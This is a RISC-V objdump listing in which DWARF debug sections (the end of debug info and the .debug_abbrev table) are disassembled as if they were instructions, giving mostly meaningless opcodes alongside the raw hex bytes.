    240c:	0100                	addi	s0,sp,128
    240e:	0956                	slli	s2,s2,0x15
    2410:	0049                	c.nop	18
    2412:	0000                	unimp
    2414:	9102                	jalr	sp
    2416:	3444                	fld	fs1,168(s0)
    2418:	7165                	addi	sp,sp,-400
    241a:	0032                	c.slli	zero,0xc
    241c:	5601                	li	a2,-32
    241e:	4919                	li	s2,6
    2420:	0000                	unimp
    2422:	0200                	addi	s0,sp,256
    2424:	4091                	li	ra,4
    2426:	0000                	unimp
    2428:	0812                	slli	a6,a6,0x4
    242a:	167c                	addi	a5,sp,812
    242c:	0000                	unimp
    242e:	0802                	slli	a6,a6,0x0
    2430:	2b04                	fld	fs1,16(a4)
    2432:	05000003          	lb	zero,80(zero) # 7396 <_tbss_end+0x7312>
    2436:	1670                	addi	a2,sp,812
    2438:	0000                	unimp
    243a:	7704                	ld	s1,40(a4)
    243c:	0016                	c.slli	zero,0x5
    243e:	1200                	addi	s0,sp,288
    2440:	7708                	ld	a0,40(a4)
    2442:	0016                	c.slli	zero,0x5
    2444:	3800                	fld	fs0,48(s0)
    2446:	095f 0000 3e01      	0x3e010000095f
    244c:	490c                	lw	a1,16(a0)
    244e:	0000                	unimp
    2450:	e000                	sd	s0,0(s0)
    2452:	0015                	c.nop	5
    2454:	0080                	addi	s0,sp,64
    2456:	0000                	unimp
    2458:	0a00                	addi	s0,sp,272
    245a:	0001                	nop
    245c:	0000                	unimp
    245e:	0000                	unimp
    2460:	0100                	addi	s0,sp,128
    2462:	2d9c                	fld	fa5,24(a1)
    2464:	33000017          	auipc	zero,0x33000
    2468:	006e                	c.slli	zero,0x1b
    246a:	3e01                	addiw	t3,t3,-32
    246c:	00004917          	auipc	s2,0x4
    2470:	0200                	addi	s0,sp,256
    2472:	4c91                	li	s9,4
    2474:	0632                	slli	a2,a2,0xc
    2476:	0009                	c.nop	2
    2478:	0100                	addi	s0,sp,128
    247a:	2e3e                	fld	ft8,456(sp)
    247c:	172d                	addi	a4,a4,-21
    247e:	0000                	unimp
    2480:	9102                	jalr	sp
    2482:	3240                	fld	fs0,160(a2)
    2484:	095f 0000 3e01      	0x3e010000095f
    248a:	0017333f b8910300 	0xb89103000017333f
    2492:	347f                	0x347f
    2494:	0069                	c.nop	26
    2496:	4001                	c.li	zero,0
    2498:	00004907          	flq	fs2,0(zero) # 33002464 <_tbss_end+0x330023e0>
    249c:	0200                	addi	s0,sp,256
    249e:	6c91                	lui	s9,0x4
    24a0:	fa2c                	sd	a1,112(a2)
    24a2:	0015                	c.nop	5
    24a4:	0080                	addi	s0,sp,64
    24a6:	0000                	unimp
    24a8:	8000                	0x8000
    24aa:	0000                	unimp
    24ac:	0000                	unimp
    24ae:	0000                	unimp
    24b0:	3400                	fld	fs0,40(s0)
    24b2:	3074                	fld	fa3,224(s0)
    24b4:	0100                	addi	s0,sp,128
    24b6:	0944                	addi	s1,sp,148
    24b8:	0049                	c.nop	18
    24ba:	0000                	unimp
    24bc:	9102                	jalr	sp
    24be:	3468                	fld	fa0,232(s0)
    24c0:	3174                	fld	fa3,224(a0)
    24c2:	0100                	addi	s0,sp,128
    24c4:	1744                	addi	s1,sp,932
    24c6:	0049                	c.nop	18
    24c8:	0000                	unimp
    24ca:	9102                	jalr	sp
    24cc:	3464                	fld	fs1,232(s0)
    24ce:	3076                	fld	ft0,376(sp)
    24d0:	0100                	addi	s0,sp,128
    24d2:	0945                	addi	s2,s2,17
    24d4:	0049                	c.nop	18
    24d6:	0000                	unimp
    24d8:	9102                	jalr	sp
    24da:	3460                	fld	fs0,232(s0)
    24dc:	3176                	fld	ft2,376(sp)
    24de:	0100                	addi	s0,sp,128
    24e0:	1945                	addi	s2,s2,-15
    24e2:	0049                	c.nop	18
    24e4:	0000                	unimp
    24e6:	9102                	jalr	sp
    24e8:	005c                	addi	a5,sp,4
    24ea:	1200                	addi	s0,sp,288
    24ec:	5508                	lw	a0,40(a0)
    24ee:	0000                	unimp
    24f0:	1200                	addi	s0,sp,288
    24f2:	5a08                	lw	a0,48(a2)
    24f4:	0000                	unimp
    24f6:	4300                	lw	s0,0(a4)
    24f8:	0780                	addi	s0,sp,960
    24fa:	0000                	unimp
    24fc:	3301                	addiw	t1,t1,-32
    24fe:	c40d                	beqz	s0,2528 <_tbss_end+0x24a4>
    2500:	0015                	c.nop	5
    2502:	0080                	addi	s0,sp,64
    2504:	0000                	unimp
    2506:	1c00                	addi	s0,sp,560
    2508:	0000                	unimp
    250a:	0000                	unimp
    250c:	0000                	unimp
    250e:	0100                	addi	s0,sp,128
    2510:	839c                	0x839c
    2512:	32000017          	auipc	zero,0x32000
    2516:	0644                	addi	s1,sp,772
    2518:	0000                	unimp
    251a:	3301                	addiw	t1,t1,-32
    251c:	4a29                	li	s4,10
    251e:	0006                	c.slli	zero,0x1
    2520:	0200                	addi	s0,sp,256
    2522:	6891                	lui	a7,0x4
    2524:	01006e33          	or	t3,zero,a6
    2528:	00493533          	sltu	a0,s2,tp
    252c:	0000                	unimp
    252e:	9102                	jalr	sp
    2530:	3364                	fld	fs1,224(a4)
    2532:	7261                	lui	tp,0xffff8
    2534:	0072                	c.slli	zero,0x1c
    2536:	3301                	addiw	t1,t1,-32
    2538:	8145                	srli	a0,a0,0x11
    253a:	0016                	c.slli	zero,0x5
    253c:	0200                	addi	s0,sp,256
    253e:	5891                	li	a7,-28
    2540:	4400                	lw	s0,8(s0)
    2542:	065a                	slli	a2,a2,0x16
    2544:	0000                	unimp
    2546:	2801                	sext.w	a6,a6
    2548:	a80d                	j	257a <_tbss_end+0x24f6>
    254a:	0015                	c.nop	5
    254c:	0080                	addi	s0,sp,64
    254e:	0000                	unimp
    2550:	1c00                	addi	s0,sp,560
    2552:	0000                	unimp
    2554:	0000                	unimp
    2556:	0000                	unimp
    2558:	0100                	addi	s0,sp,128
    255a:	329c                	fld	fa5,32(a3)
    255c:	0644                	addi	s1,sp,772
    255e:	0000                	unimp
    2560:	2801                	sext.w	a6,a6
    2562:	00064a23          	0x64a23
    2566:	0200                	addi	s0,sp,256
    2568:	6891                	lui	a7,0x4
    256a:	01006e33          	or	t3,zero,a6
    256e:	2f28                	fld	fa0,88(a4)
    2570:	0049                	c.nop	18
    2572:	0000                	unimp
    2574:	9102                	jalr	sp
    2576:	3364                	fld	fs1,224(a4)
    2578:	7261                	lui	tp,0xffff8
    257a:	0072                	c.slli	zero,0x1c
    257c:	2801                	sext.w	a6,a6
    257e:	333c                	fld	fa5,96(a4)
    2580:	02000017          	auipc	zero,0x2000
    2584:	5891                	li	a7,-28
	...

Disassembly of section .debug_abbrev:

0000000000000000 <.debug_abbrev>:
   0:	1101                	addi	sp,sp,-32
   2:	2501                	sext.w	a0,a0
   4:	130e                	slli	t1,t1,0x23
   6:	1b0e030b          	0x1b0e030b
   a:	110e                	slli	sp,sp,0x23
   c:	1201                	addi	tp,tp,-32
   e:	00171007          	0x171007
  12:	0200                	addi	s0,sp,256
  14:	0024                	addi	s1,sp,8
  16:	0b3e0b0b          	0xb3e0b0b
  1a:	00000e03          	lb	t3,0(zero) # 2002580 <_tbss_end+0x20024fc>
  1e:	03001603          	lh	a2,48(zero) # 30 <_tdata_begin+0x30>
  22:	3a0e                	fld	fs4,224(sp)
  24:	490b3b0b          	0x490b3b0b
  28:	04000013          	li	zero,64
  2c:	0024                	addi	s1,sp,8
  2e:	0b3e0b0b          	0xb3e0b0b
  32:	00000803          	lb	a6,0(zero) # 0 <_tdata_begin>
  36:	1605                	addi	a2,a2,-31
  38:	0300                	addi	s0,sp,384
  3a:	3a0e                	fld	fs4,224(sp)
  3c:	49053b0b          	0x49053b0b
  40:	06000013          	li	zero,96
  44:	0b0b0117          	auipc	sp,0xb0b0
  48:	0b3a                	slli	s6,s6,0xe
  4a:	13010b3b          	0x13010b3b
  4e:	0000                	unimp
  50:	03000d07          	0x3000d07
  54:	3a0e                	fld	fs4,224(sp)
  56:	490b3b0b          	0x490b3b0b
  5a:	08000013          	li	zero,128
  5e:	0101                	addi	sp,sp,0
  60:	1349                	addi	t1,t1,-14
  62:	1301                	addi	t1,t1,-32
  64:	0000                	unimp
  66:	2109                	addiw	sp,sp,2
  68:	4900                	lw	s0,16(a0)
  6a:	000b2f13          	slti	t5,s6,0
  6e:	0a00                	addi	s0,sp,272
  70:	0b0b0113          	addi	sp,s6,176 # c0b0 <_tbss_end+0xc02c>
  74:	0b3a                	slli	s6,s6,0xe
  76:	13010b3b          	0x13010b3b
  7a:	0000                	unimp
  7c:	03000d0b          	0x3000d0b
  80:	3a0e                	fld	fs4,224(sp)
  82:	490b3b0b          	0x490b3b0b
  86:	000b3813          	sltiu	a6,s6,0
  8a:	0c00                	addi	s0,sp,528
  8c:	0b0b000f          	0xb0b000f
  90:	0000                	unimp
  92:	130d                	addi	t1,t1,-29
  94:	0301                	addi	t1,t1,0
  96:	0b0e                	slli	s6,s6,0x3
  98:	3b0b3a0b          	0x3b0b3a0b
  9c:	0013010b          	0x13010b
  a0:	0e00                	addi	s0,sp,784
  a2:	000d                	c.nop	3
  a4:	0b3a0803          	lb	a6,179(s4) # 1c795 <_tbss_end+0x1c711>
  a8:	13490b3b          	0x13490b3b
  ac:	0b38                	addi	a4,sp,408
  ae:	0000                	unimp
  b0:	0b000f0f          	0xb000f0f
  b4:	0013490b          	0x13490b
  b8:	1000                	addi	s0,sp,32
  ba:	0e030113          	addi	sp,t1,224 # 670e0 <_tbss_end+0x6705c>
  be:	0b3a050b          	0xb3a050b
  c2:	13010b3b          	0x13010b3b
  c6:	0000                	unimp
  c8:	0d11                	addi	s10,s10,4
  ca:	0300                	addi	s0,sp,384
  cc:	3a0e                	fld	fs4,224(sp)
  ce:	490b3b0b          	0x490b3b0b
  d2:	00053813          	sltiu	a6,a0,0
  d6:	1200                	addi	s0,sp,288
  d8:	0015                	c.nop	5
  da:	00001927          	0x1927
  de:	27011513          	0x27011513
  e2:	4919                	li	s2,6
  e4:	00130113          	addi	sp,t1,1
  e8:	1400                	addi	s0,sp,544
  ea:	0005                	c.nop	1
  ec:	1349                	addi	t1,t1,-14
  ee:	0000                	unimp
  f0:	2615                	addiw	a2,a2,5
  f2:	4900                	lw	s0,16(a0)
  f4:	16000013          	li	zero,352
  f8:	0e030113          	addi	sp,t1,224
  fc:	0b3a050b          	0xb3a050b
 100:	1301053b          	0x1301053b
 104:	0000                	unimp
 106:	03000d17          	auipc	s10,0x3000
 10a:	3a0e                	fld	fs4,224(sp)
 10c:	49053b0b          	0x49053b0b
 110:	000b3813          	sltiu	a6,s6,0
 114:	1800                	addi	s0,sp,48
 116:	000d                	c.nop	3
 118:	0b3a0e03          	lb	t3,179(s4)
 11c:	1349053b          	0x1349053b
 120:	0538                	addi	a4,sp,648
 122:	0000                	unimp
 124:	1319                	addi	t1,t1,-26
 126:	0301                	addi	t1,t1,0
 128:	0b0e                	slli	s6,s6,0x3
 12a:	3b0b3a0b          	0x3b0b3a0b
 12e:	0105                	addi	sp,sp,1
 130:	1a000013          	li	zero,416
 134:	0b0b0113          	addi	sp,s6,176
 138:	0b3a                	slli	s6,s6,0xe
 13a:	1301053b          	0x1301053b
 13e:	0000                	unimp
 140:	0b01131b          	0xb01131b
 144:	3a05                	addiw	s4,s4,-31
 146:	01053b0b          	0x1053b0b
 14a:	1c000013          	li	zero,448
 14e:	050b0117          	auipc	sp,0x50b0
 152:	0b3a                	slli	s6,s6,0xe
 154:	1301053b          	0x1301053b
 158:	0000                	unimp
 15a:	0d1d                	addi	s10,s10,7
 15c:	0300                	addi	s0,sp,384
 15e:	3a0e                	fld	fs4,224(sp)
 160:	49053b0b          	0x49053b0b
 164:	1e000013          	li	zero,480
 168:	0e030013          	addi	zero,t1,224
 16c:	193c                	addi	a5,sp,184
 16e:	0000                	unimp
 170:	151f 2701 0119      	0x1192701151f
 176:	20000013          	li	zero,512
 17a:	0034                	addi	a3,sp,8
 17c:	0b3a0e03          	lb	t3,179(s4)
 180:	1349053b          	0x1349053b
 184:	193c193f 21210000 	0x21210000193c193f
 18c:	4900                	lw	s0,16(a0)
 18e:	00062f13          	slti	t5,a2,0
 192:	2200                	fld	fs0,0(a2)
 194:	0034                	addi	a3,sp,8
 196:	0b3a0e03          	lb	t3,179(s4)
 19a:	13490b3b          	0x13490b3b
 19e:	1802193f 21230000 	0x212300001802193f
 1a6:	4900                	lw	s0,16(a0)
 1a8:	00052f13          	slti	t5,a0,0
 1ac:	2400                	fld	fs0,8(s0)
 1ae:	0034                	addi	a3,sp,8
 1b0:	0b3a0803          	lb	a6,179(s4)
 1b4:	13490b3b          	0x13490b3b
 1b8:	1802193f 2e250000 	0x2e2500001802193f
 1c0:	3f01                	addiw	t5,t5,-32
 1c2:	0319                	addi	t1,t1,6
 1c4:	3a0e                	fld	fs4,224(sp)
 1c6:	270b3b0b          	0x270b3b0b
 1ca:	4919                	li	s2,6
 1cc:	12011113          	0x12011113
 1d0:	96184007          	flq	ft0,-1695(a6)
 1d4:	1942                	slli	s2,s2,0x30
 1d6:	1301                	addi	t1,t1,-32
 1d8:	0000                	unimp
 1da:	3426                	fld	fs0,104(sp)
 1dc:	0300                	addi	s0,sp,384
 1de:	3a0e                	fld	fs4,224(sp)
 1e0:	490b3b0b          	0x490b3b0b
 1e4:	00180213          	addi	tp,a6,1
 1e8:	2700                	fld	fs0,8(a4)
 1ea:	0111010b          	0x111010b
 1ee:	0712                	slli	a4,a4,0x4
 1f0:	0000                	unimp
 1f2:	3428                	fld	fa0,104(s0)
 1f4:	0300                	addi	s0,sp,384
 1f6:	3a08                	fld	fa0,48(a2)
 1f8:	490b3b0b          	0x490b3b0b
 1fc:	00180213          	addi	tp,a6,1
 200:	2900                	fld	fs0,16(a0)
 202:	0111010b          	0x111010b
 206:	0712                	slli	a4,a4,0x4
 208:	1301                	addi	t1,t1,-32
 20a:	0000                	unimp
 20c:	2e2a                	fld	ft8,136(sp)
 20e:	3f01                	addiw	t5,t5,-32
 210:	0319                	addi	t1,t1,6
 212:	3a0e                	fld	fs4,224(sp)
 214:	270b3b0b          	0x270b3b0b
 218:	1119                	addi	sp,sp,-26
 21a:	1201                	addi	tp,tp,-32
 21c:	97184007          	flq	ft0,-1679(a6)
 220:	1942                	slli	s2,s2,0x30
 222:	1301                	addi	t1,t1,-32
 224:	0000                	unimp
 226:	0300052b          	0x300052b
 22a:	3a08                	fld	fa0,48(a2)
 22c:	490b3b0b          	0x490b3b0b
 230:	00180213          	addi	tp,a6,1
 234:	2c00                	fld	fs0,24(s0)
 236:	0005                	c.nop	1
 238:	0b3a0e03          	lb	t3,179(s4)
 23c:	13490b3b          	0x13490b3b
 240:	1802                	slli	a6,a6,0x20
 242:	0000                	unimp
 244:	2e2d                	addiw	t3,t3,11
 246:	3f01                	addiw	t5,t5,-32
 248:	0319                	addi	t1,t1,6
 24a:	3a0e                	fld	fs4,224(sp)
 24c:	270b3b0b          	0x270b3b0b
 250:	1119                	addi	sp,sp,-26
 252:	1201                	addi	tp,tp,-32
 254:	97184007          	flq	ft0,-1679(a6)
 258:	1942                	slli	s2,s2,0x30
 25a:	0000                	unimp
 25c:	0100                	addi	s0,sp,128
 25e:	0011                	c.nop	4
 260:	0610                	addi	a2,sp,768
 262:	0111                	addi	sp,sp,4
 264:	0112                	slli	sp,sp,0x4
 266:	0e1b0e03          	lb	t3,225(s6)
 26a:	0e25                	addi	t3,t3,9
 26c:	00000513          	li	a0,0
 270:	0100                	addi	s0,sp,128
 272:	0011                	c.nop	4
 274:	0610                	addi	a2,sp,768
 276:	0111                	addi	sp,sp,4
 278:	0112                	slli	sp,sp,0x4
 27a:	0e1b0e03          	lb	t3,225(s6)
 27e:	0e25                	addi	t3,t3,9
 280:	00000513          	li	a0,0
 284:	0100                	addi	s0,sp,128
 286:	0111                	addi	sp,sp,4
 288:	0e25                	addi	t3,t3,9
 28a:	0e030b13          	addi	s6,t1,224
 28e:	01110e1b          	addiw	t3,sp,17
 292:	0712                	slli	a4,a4,0x4
 294:	1710                	addi	a2,sp,928
 296:	0000                	unimp
 298:	2402                	fld	fs0,0(sp)
 29a:	0b00                	addi	s0,sp,400
 29c:	030b3e0b          	0x30b3e0b
 2a0:	000e                	c.slli	zero,0x3
 2a2:	0300                	addi	s0,sp,384
 2a4:	0024                	addi	s1,sp,8
 2a6:	0b3e0b0b          	0xb3e0b0b
 2aa:	00000803          	lb	a6,0(zero) # 0 <_tdata_begin>
 2ae:	3504                	fld	fs1,40(a0)
 2b0:	4900                	lw	s0,16(a0)
 2b2:	05000013          	li	zero,80
 2b6:	0026                	c.slli	zero,0x9
 2b8:	1349                	addi	t1,t1,-14
 2ba:	0000                	unimp
 2bc:	1606                	slli	a2,a2,0x21
 2be:	0300                	addi	s0,sp,384
 2c0:	3a0e                	fld	fs4,224(sp)
 2c2:	390b3b0b          	0x390b3b0b
 2c6:	0013490b          	0x13490b
 2ca:	0700                	addi	s0,sp,896
 2cc:	0016                	c.slli	zero,0x5
 2ce:	0b3a0e03          	lb	t3,179(s4)
 2d2:	0b39053b          	0xb39053b
 2d6:	1349                	addi	t1,t1,-14
 2d8:	0000                	unimp
 2da:	1708                	addi	a0,sp,928
 2dc:	0b01                	addi	s6,s6,0
 2de:	3b0b3a0b          	0x3b0b3a0b
 2e2:	010b390b          	0x10b390b
 2e6:	09000013          	li	zero,144
 2ea:	000d                	c.nop	3
 2ec:	0b3a0e03          	lb	t3,179(s4)
 2f0:	0b390b3b          	0xb390b3b
 2f4:	1349                	addi	t1,t1,-14
 2f6:	0000                	unimp
 2f8:	010a                	slli	sp,sp,0x2
 2fa:	4901                	li	s2,0
 2fc:	00130113          	addi	sp,t1,1
 300:	0b00                	addi	s0,sp,400
 302:	0021                	c.nop	8
 304:	1349                	addi	t1,t1,-14
 306:	00000b2f          	0xb2f
 30a:	130c                	addi	a1,sp,416
 30c:	0b01                	addi	s6,s6,0
 30e:	3b0b3a0b          	0x3b0b3a0b
 312:	010b390b          	0x10b390b
 316:	0d000013          	li	zero,208
 31a:	000d                	c.nop	3
 31c:	0b3a0e03          	lb	t3,179(s4)
 320:	0b390b3b          	0xb390b3b
 324:	1349                	addi	t1,t1,-14
 326:	0b38                	addi	a4,sp,408
 328:	0000                	unimp
 32a:	0f0e                	slli	t5,t5,0x3
 32c:	0b00                	addi	s0,sp,400
 32e:	0f00000b          	0xf00000b
 332:	0b0b000f          	0xb0b000f
 336:	00000e03          	lb	t3,0(zero) # 0 <_tdata_begin>
 33a:	1310                	addi	a2,sp,416
 33c:	0301                	addi	t1,t1,0
 33e:	0b0e                	slli	s6,s6,0x3
 340:	3b0b3a0b          	0x3b0b3a0b
 344:	010b390b          	0x10b390b
 348:	11000013          	li	zero,272
 34c:	000d                	c.nop	3
 34e:	0b3a0803          	lb	a6,179(s4)
 352:	0b390b3b          	0xb390b3b
 356:	1349                	addi	t1,t1,-14
 358:	0b38                	addi	a4,sp,408
 35a:	0000                	unimp
 35c:	0f12                	slli	t5,t5,0x4
 35e:	0b00                	addi	s0,sp,400
 360:	0013490b          	0x13490b
 364:	1300                	addi	s0,sp,416
 366:	0e030113          	addi	sp,t1,224
 36a:	0b3a050b          	0xb3a050b
 36e:	0b390b3b          	0xb390b3b
 372:	1301                	addi	t1,t1,-32
 374:	0000                	unimp
 376:	0d14                	addi	a3,sp,656
 378:	0300                	addi	s0,sp,384
 37a:	3a0e                	fld	fs4,224(sp)
 37c:	390b3b0b          	0x390b3b0b
 380:	3813490b          	0x3813490b
 384:	0005                	c.nop	1
 386:	1500                	addi	s0,sp,672
 388:	0015                	c.nop	5
 38a:	00001927          	0x1927
 38e:	1516                	slli	a0,a0,0x25
 390:	2701                	sext.w	a4,a4
 392:	4919                	li	s2,6
 394:	00130113          	addi	sp,t1,1
 398:	1700                	addi	s0,sp,928
 39a:	0005                	c.nop	1
 39c:	1349                	addi	t1,t1,-14
 39e:	0000                	unimp
 3a0:	1318                	addi	a4,sp,416
 3a2:	0301                	addi	t1,t1,0
 3a4:	0b0e                	slli	s6,s6,0x3
 3a6:	3a05                	addiw	s4,s4,-31
 3a8:	39053b0b          	0x39053b0b
 3ac:	0013010b          	0x13010b
 3b0:	1900                	addi	s0,sp,176
 3b2:	000d                	c.nop	3
 3b4:	0b3a0e03          	lb	t3,179(s4)
 3b8:	0b39053b          	0xb39053b
 3bc:	1349                	addi	t1,t1,-14
 3be:	0b38                	addi	a4,sp,408
 3c0:	0000                	unimp
 3c2:	0d1a                	slli	s10,s10,0x6
 3c4:	0300                	addi	s0,sp,384
 3c6:	3a0e                	fld	fs4,224(sp)
 3c8:	39053b0b          	0x39053b0b
 3cc:	3813490b          	0x3813490b
 3d0:	0005                	c.nop	1
 3d2:	1b00                	addi	s0,sp,432
 3d4:	0e030113          	addi	sp,t1,224
 3d8:	0b3a0b0b          	0xb3a0b0b
 3dc:	0b39053b          	0xb39053b
 3e0:	1301                	addi	t1,t1,-32
 3e2:	0000                	unimp
 3e4:	131c                	addi	a5,sp,416
 3e6:	0b01                	addi	s6,s6,0
 3e8:	3b0b3a0b          	0x3b0b3a0b
 3ec:	3905                	addiw	s2,s2,-31
 3ee:	0013010b          	0x13010b
 3f2:	1d00                	addi	s0,sp,688
 3f4:	050b0113          	addi	sp,s6,80
 3f8:	0b3a                	slli	s6,s6,0xe
 3fa:	0b39053b          	0xb39053b
 3fe:	1301                	addi	t1,t1,-32
 400:	0000                	unimp
 402:	171e                	slli	a4,a4,0x27
 404:	0b01                	addi	s6,s6,0
 406:	3a05                	addiw	s4,s4,-31
 408:	39053b0b          	0x39053b0b
 40c:	0013010b          	0x13010b
 410:	1f00                	addi	s0,sp,944
 412:	000d                	c.nop	3
 414:	0b3a0e03          	lb	t3,179(s4)
 418:	0b39053b          	0xb39053b
 41c:	1349                	addi	t1,t1,-14
 41e:	0000                	unimp
 420:	1320                	addi	s0,sp,424
 422:	0300                	addi	s0,sp,384
 424:	3c0e                	fld	fs8,224(sp)
 426:	0019                	c.nop	6
 428:	2100                	fld	fs0,0(a0)
 42a:	0115                	addi	sp,sp,5
 42c:	13011927          	0x13011927
 430:	0000                	unimp
 432:	3422                	fld	fs0,40(sp)
 434:	0300                	addi	s0,sp,384
 436:	3a0e                	fld	fs4,224(sp)
 438:	39053b0b          	0x39053b0b
 43c:	3f13490b          	0x3f13490b
 440:	3c19                	addiw	s8,s8,-26
 442:	0019                	c.nop	6
 444:	2300                	fld	fs0,0(a4)
 446:	0034                	addi	a3,sp,8
 448:	0b3a0e03          	lb	t3,179(s4)
 44c:	0b390b3b          	0xb390b3b
 450:	1349                	addi	t1,t1,-14
 452:	193c193f 34240000 	0x34240000193c193f
 45a:	0300                	addi	s0,sp,384
 45c:	3a0e                	fld	fs4,224(sp)
 45e:	390b3b0b          	0x390b3b0b
 462:	0213490b          	0x213490b
 466:	0018                	0x18
 468:	2500                	fld	fs0,8(a0)
 46a:	012e                	slli	sp,sp,0xb
 46c:	0e03193f 053b0b3a 	0x53b0b3a0e03193f
 474:	0b39                	addi	s6,s6,14
 476:	13491927          	0x13491927
 47a:	0111                	addi	sp,sp,4
 47c:	0712                	slli	a4,a4,0x4
 47e:	1840                	addi	s0,sp,52
 480:	01194297          	auipc	t0,0x1194
 484:	26000013          	li	zero,608
 488:	0005                	c.nop	1
 48a:	0b3a0803          	lb	a6,179(s4)
 48e:	0b39053b          	0xb39053b
 492:	1349                	addi	t1,t1,-14
 494:	1802                	slli	a6,a6,0x20
 496:	0000                	unimp
 498:	03003427          	fsd	fa6,40(zero) # 28 <_tdata_begin+0x28>
 49c:	3a08                	fld	fa0,48(a2)
 49e:	39053b0b          	0x39053b0b
 4a2:	0213490b          	0x213490b
 4a6:	0018                	0x18
 4a8:	2800                	fld	fs0,16(s0)
 4aa:	0034                	addi	a3,sp,8
 4ac:	0b3a0e03          	lb	t3,179(s4)
 4b0:	0b39053b          	0xb39053b
 4b4:	1349                	addi	t1,t1,-14
 4b6:	1802                	slli	a6,a6,0x20
 4b8:	0000                	unimp
 4ba:	2e29                	addiw	t3,t3,10
 4bc:	3f01                	addiw	t5,t5,-32
 4be:	0319                	addi	t1,t1,6
 4c0:	3a0e                	fld	fs4,224(sp)
 4c2:	390b3b0b          	0x390b3b0b
 4c6:	4919270b          	0x4919270b
 4ca:	12011113          	0x12011113
 4ce:	97184007          	flq	ft0,-1679(a6)
 4d2:	1942                	slli	s2,s2,0x30
 4d4:	1301                	addi	t1,t1,-32
 4d6:	0000                	unimp
 4d8:	052a                	slli	a0,a0,0xa
 4da:	0300                	addi	s0,sp,384
 4dc:	3a0e                	fld	fs4,224(sp)
 4de:	39053b0b          	0x39053b0b
 4e2:	0213490b          	0x213490b
 4e6:	0018                	0x18
 4e8:	2b00                	fld	fs0,16(a4)
 4ea:	0111010b          	0x111010b
 4ee:	0712                	slli	a4,a4,0x4
 4f0:	1301                	addi	t1,t1,-32
 4f2:	0000                	unimp
 4f4:	0b2c                	addi	a1,sp,408
 4f6:	1101                	addi	sp,sp,-32
 4f8:	1201                	addi	tp,tp,-32
 4fa:	2d000007          	0x2d000007
 4fe:	0026                	c.slli	zero,0x9
 500:	0000                	unimp
 502:	2e2e                	fld	ft8,200(sp)
 504:	3f01                	addiw	t5,t5,-32
 506:	0319                	addi	t1,t1,6
 508:	3a0e                	fld	fs4,224(sp)
 50a:	390b3b0b          	0x390b3b0b
 50e:	4919270b          	0x4919270b
 512:	12011113          	0x12011113
 516:	96184007          	flq	ft0,-1695(a6)
 51a:	1942                	slli	s2,s2,0x30
 51c:	1301                	addi	t1,t1,-32
 51e:	0000                	unimp
 520:	0000182f          	0x182f
 524:	3000                	fld	fs0,32(s0)
 526:	012e                	slli	sp,sp,0xb
 528:	0b3a0e03          	lb	t3,179(s4)
 52c:	0b39053b          	0xb39053b
 530:	01111927          	0x1111927
 534:	0712                	slli	a4,a4,0x4
 536:	1840                	addi	s0,sp,52
 538:	1848                	addi	a0,sp,52
 53a:	00194297          	auipc	t0,0x194
 53e:	3100                	fld	fs0,32(a0)
 540:	012e                	slli	sp,sp,0xb
 542:	0b3a0e03          	lb	t3,179(s4)
 546:	0b390b3b          	0xb390b3b
 54a:	01111927          	0x1111927
 54e:	0712                	slli	a4,a4,0x4
 550:	1840                	addi	s0,sp,52
 552:	4296                	lw	t0,68(sp)
 554:	0119                	addi	sp,sp,6
 556:	32000013          	li	zero,800
 55a:	0005                	c.nop	1
 55c:	0b3a0e03          	lb	t3,179(s4)
 560:	0b390b3b          	0xb390b3b
 564:	1349                	addi	t1,t1,-14
 566:	1802                	slli	a6,a6,0x20
 568:	0000                	unimp
 56a:	03000533          	mul	a0,zero,a6
 56e:	3a08                	fld	fa0,48(a2)
 570:	390b3b0b          	0x390b3b0b
 574:	0213490b          	0x213490b
 578:	0018                	0x18
 57a:	3400                	fld	fs0,40(s0)
 57c:	0034                	addi	a3,sp,8
 57e:	0b3a0803          	lb	a6,179(s4)
 582:	0b390b3b          	0xb390b3b
 586:	1349                	addi	t1,t1,-14
 588:	1802                	slli	a6,a6,0x20
 58a:	0000                	unimp
 58c:	3435                	addiw	s0,s0,-19
 58e:	0300                	addi	s0,sp,384
 590:	3a08                	fld	fa0,48(a2)
 592:	390b3b0b          	0x390b3b0b
 596:	0013490b          	0x13490b
 59a:	3600                	fld	fs0,40(a2)
 59c:	000a                	c.slli	zero,0x2
 59e:	0b3a0e03          	lb	t3,179(s4)
 5a2:	0b390b3b          	0xb390b3b
 5a6:	0111                	addi	sp,sp,4
 5a8:	0000                	unimp
 5aa:	03000a37          	lui	s4,0x3000
 5ae:	3a0e                	fld	fs4,224(sp)
 5b0:	39053b0b          	0x39053b0b
 5b4:	0001110b          	0x1110b
 5b8:	3800                	fld	fs0,48(s0)
 5ba:	012e                	slli	sp,sp,0xb
 5bc:	0b3a0e03          	lb	t3,179(s4) # 30000b3 <_tbss_end+0x300002f>
 5c0:	0b390b3b          	0xb390b3b
 5c4:	13491927          	0x13491927
 5c8:	0111                	addi	sp,sp,4
 5ca:	0712                	slli	a4,a4,0x4
 5cc:	1840                	addi	s0,sp,52
 5ce:	01194297          	auipc	t0,0x1194
 5d2:	39000013          	li	zero,912
 5d6:	012e                	slli	sp,sp,0xb
 5d8:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 5e0:	0b39                	addi	s6,s6,14
 5e2:	01111927          	0x1111927
 5e6:	0712                	slli	a4,a4,0x4
 5e8:	1840                	addi	s0,sp,52
 5ea:	4296                	lw	t0,68(sp)
 5ec:	0119                	addi	sp,sp,6
 5ee:	3a000013          	li	zero,928
 5f2:	0034                	addi	a3,sp,8
 5f4:	0b3a0803          	lb	a6,179(s4)
 5f8:	0b390b3b          	0xb390b3b
 5fc:	1349                	addi	t1,t1,-14
 5fe:	0188                	addi	a0,sp,192
 600:	3b00000b          	0x3b00000b
 604:	0034                	addi	a3,sp,8
 606:	0b3a0e03          	lb	t3,179(s4)
 60a:	0b390b3b          	0xb390b3b
 60e:	1349                	addi	t1,t1,-14
 610:	0000                	unimp
 612:	343c                	fld	fa5,104(s0)
 614:	0300                	addi	s0,sp,384
 616:	3a08                	fld	fa0,48(a2)
 618:	390b3b0b          	0x390b3b0b
 61c:	8813490b          	0x8813490b
 620:	0b01                	addi	s6,s6,0
 622:	1802                	slli	a6,a6,0x20
 624:	0000                	unimp
 626:	2e3d                	addiw	t3,t3,15
 628:	0301                	addi	t1,t1,0
 62a:	3a0e                	fld	fs4,224(sp)
 62c:	390b3b0b          	0x390b3b0b
 630:	1201110b          	0x1201110b
 634:	96184007          	flq	ft0,-1695(a6)
 638:	1942                	slli	s2,s2,0x30
 63a:	1301                	addi	t1,t1,-32
 63c:	0000                	unimp
 63e:	2e3e                	fld	ft8,456(sp)
